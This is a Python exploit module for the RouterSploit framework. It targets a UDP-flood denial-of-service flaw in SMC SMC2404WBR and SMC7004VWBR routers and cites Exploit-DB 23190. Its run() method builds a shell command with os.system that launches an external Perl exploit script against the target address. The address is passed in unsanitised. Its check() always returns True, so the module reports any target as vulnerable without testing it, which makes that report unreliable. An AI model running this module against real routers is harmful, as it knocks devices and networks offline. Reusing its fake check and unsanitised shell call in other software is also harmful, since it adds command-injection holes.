import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "SMC_Router_1.2x-Random_UDP_Packet_Denial_of_Service",

        "description": " A denial of service has been reported in the SMC SMC2404WBR BarricadeT Turbo 11/22 Mbps Wireless Cable/DSL Broadband Router. "
                       " It is possible to trigger this condition by sending UDP packets randomly to ports 0-65000. "
                       "The SMC7004VWBR router is also affected by this vulnerability ",

        "authors": (

            "_6mO_HaCk",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/23190",

        ),

        "devices": (

            "SMC, EDB-ID:23190"
        ),
    }

    target = OptIP(""," hostname ")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "perl exploit-db-23190.pl {}".format(self.target)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True